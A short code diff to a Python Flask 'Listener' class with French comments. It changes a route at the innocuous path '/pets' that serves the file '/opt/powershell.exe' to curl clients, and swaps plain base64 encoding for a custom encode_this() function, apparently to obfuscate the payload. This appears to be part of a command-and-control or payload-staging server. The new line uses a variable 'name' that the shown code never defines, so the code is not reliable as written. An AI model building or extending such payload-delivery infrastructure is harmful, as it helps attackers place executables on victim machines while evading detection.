@@ -234,16 +234,18 @@ class Listener():
                 # En cas d’erreur (fichier manquant, permissions, etc.)
                 return Response(f"error: {e}", status=500, mimetype='text/plain')
         @self.app.route("/pets", methods=['GET'])
-        def serve_powershell():
+        def serve_nhell():
             file_path = "/opt/powershell.exe"
         
             try:
                 with open(file_path, "rb") as f:
                     raw = f.read()
-                b64_str = base64.b64encode(raw).decode('ascii')
+                #b64_str = base64.b64encode(raw).decode('ascii')
+                b64_str = encode_this(raw,name)
+                
                 # On renvoie du texte brut pour que curl ou un navigateur
                 # puisse récupérer directement la chaîne Base64.
-                return b64_str 
+                return b64_str
             except Exception as e:
                 # En cas d’erreur (fichier manquant, permissions, etc.)
                 return Response(f"error: {e}", status=500, mimetype='text/plain')
